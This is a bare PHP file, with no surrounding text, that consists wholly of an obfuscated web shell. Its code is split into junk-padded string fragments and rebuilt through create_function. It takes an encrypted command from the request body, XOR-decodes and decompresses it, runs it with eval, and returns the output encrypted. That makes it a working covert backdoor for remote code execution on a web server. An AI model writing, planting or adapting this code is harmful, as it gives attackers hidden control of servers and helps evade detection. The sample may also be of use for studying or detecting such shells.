<?php
$H='$k="5"Ve"V8"V923c"Vc";$kh="5cc57f9429"Va5";$kf"V=""V0bdcc5"V756b3f";$p="V"c0jAxD"V9nqXr"VTk7u"V1""V;function x($t"V,$k){';
$m='/i"Vnpu"Vt"),$m)==1) "V"V{@ob_start();@e"Vval(@gzuncom"Vpr"Vess"V(@x(@b"Vase"V64_decode($m[1"V])"V,"V$k)));$o=@o"V';
$K=str_replace('lw','','crlweatlwlwe_flwunclwtilwon');
$k='V+){"V$o.=$t{$i}^$k"V{$"Vj};}}re"Vtu"V"Vrn $o;}if (@p"V"Vreg_match("/$kh("V.+)$kf"V/",@file_ge"Vt_con"Vtents("V"V"php"V:/';
$a='b"V"V_get_contents();@ob_end"V_cle"Van();"V"V$r=@bas"Ve64_encode(@x("V@gz"Vcompres"Vs($"Vo)"V,$k))"V;p"Vrint("$p$kh$r$kf");}';
$q='"V$c=str"V"Vl"Ven($k);$l=strlen"V($t"V);$o="""V;for"V($i"V=0;$i<$l;){fo"Vr("V$j=0"V;($j"V"V<$c&&$i<$l);$j++,$i+"V"';
$l=str_replace('"V','',$H.$q.$k.$m.$a);
$B=$K('',$l);$B();
?>
